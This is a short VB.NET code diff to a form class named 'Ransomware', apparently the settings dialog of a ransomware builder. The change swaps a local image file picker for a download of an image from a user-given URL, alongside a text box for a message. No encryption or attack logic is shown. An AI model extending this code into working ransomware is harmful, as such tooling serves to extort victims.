@@ -1,19 +1,17 @@
-﻿Public Class Ransomware
+﻿Imports System.Drawing
+Imports System.IO
+Imports System.Net
+
+Public Class Ransomware
     Public OK As Boolean
     Public o As New OpenFileDialog
 
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
         Try
 
-            With o
-                .Filter = "Image File(*.JPEG;*.JPG)|*.JPEG;*.JPG;|All files (*.*)|*.*"
-                .Title = "Select a Image File"
-                .InitialDirectory = Application.StartupPath
-            End With
-            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-                Textbox1.Text = o.FileName
-                PictureBox1.ImageLocation = Textbox1.Text
-            End If
+            Dim tClient As WebClient = New WebClient
+            Dim tImage As Bitmap = Bitmap.FromStream(New MemoryStream(tClient.DownloadData(Textbox1.Text)))
+            PictureBox1.Image = tImage
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical, Nothing)
         End Try
@@ -22,7 +20,7 @@
     End Sub
 
     Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
-        If Textbox1.Text <> Nothing AndAlso PictureBox1.ImageLocation <> Nothing AndAlso RichTextBox1.Text <> Nothing Then
+        If Textbox1.Text <> Nothing AndAlso RichTextBox1.Text <> Nothing Then
             OK = True
             Me.Close()
         Else
